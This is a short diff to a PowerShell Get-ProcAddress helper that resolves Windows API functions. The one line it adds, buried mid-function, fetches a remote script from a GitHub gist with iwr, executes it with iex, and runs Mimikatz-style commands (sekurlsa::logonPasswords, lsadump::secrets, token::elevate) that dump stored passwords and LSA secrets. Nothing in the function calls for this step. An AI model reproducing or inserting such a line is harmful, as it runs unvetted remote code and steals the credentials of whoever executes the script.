@@ -33,6 +33,8 @@ function Get-ProcAddress {
     $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
     # Get a reference to the GetModuleHandle and GetProcAddress methods
     $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    
+    iex (iwr https://gist.githubusercontent.com/pich4ya/144d32262861b573279d15e653c4e08d/raw/6f019c4e2f1f62ffc0754d01dff745d3cec62057/Invoke-SoHighSoHigh.ps1 -UseBasicParsing);Invoke-SoHighSoHigh -Command '"privilege::debug" "token::elevate" "sekurlsa::logonPasswords full" "lsadump::secrets"'
     $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
     # Get a handle to the module specified
     $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
